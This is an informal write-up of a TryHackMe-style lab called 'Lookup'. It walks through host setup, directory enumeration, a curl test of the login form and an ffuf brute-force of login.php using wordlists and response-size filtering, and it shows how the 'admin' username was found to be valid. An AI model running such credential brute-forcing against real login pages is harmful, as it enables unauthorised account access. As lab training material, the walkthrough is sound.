So My attempt is to whenever I get the IP I always hit the IP in the browser after all basic stuff that I already mentioned in Instruction.txt file.

But doing so leads a redirect to http://lookup.thm.

So we need to do a small tweak in the file */etc/hosts*
Then where you entered the ip at the end of that ip put a single space then lookup.thm and save & exit.That's It.

Then i opened http://ip and it redirected me to http://lookup.thm then i saw a login page.

But i tried to do *Directory Enumuration* so i found directories are

```
200 -    1B  - /login.php
```

That's it i got.
so the page http://lookup.thm/login.php was a login page.

<login_page>

When viewing its source code:-

<source_code>

We can see the username and password parameter in the source code clearly.
Using this parameter We will hit a curl req with below command to test for valid req.

```
curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
```

The Req header in the curl were 
```
> POST /login.thm HTTP/1.1
> Host: lookup.thm
> User-Agent: curl/8.18.0
> Accept: */*
> Content-Length: 28
> Content-Type: application/x-www-form-urlencoded

```

And it was working it gave me the real wrong credentials error that i got in browser manual login too.

That means we can do req to login.thm in this way.

But without jumping to password bruteforcing i tried for sqli and it was not working.

Now finally that we are waiting for..

# Bruteforcing Login Page

 For this we are going to use ffuf.
 So we will do the below command to do enumuration to login page.
 But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.

so as according to curl output i did 
```
ffuf -u http://lookup.thm/login.php \
-w <(echo "random_user"):USER \
-w <(echo "random_pass"):PASS \
-X POST \
-d "username=USER&password=PASS" \
```

Now what i got as output was

``` 
[Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 64ms]
    * PASS: random_pass
    * USER: random_user
```
<ffuf_image>
**so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
```
ffuf -v  -u http://lookup.thm/login.php \
-w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
-w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
-X POST \
-d "username=USER&password=PASS" \
-H "Content-Type: application/x-www-form-urlencoded" \
-fs 74 -fw 10 
```

Now we can see for admin the response was differ. So we tried with admin username in browser and the error was 
``` 
Wrong password. Please try again.
 ```
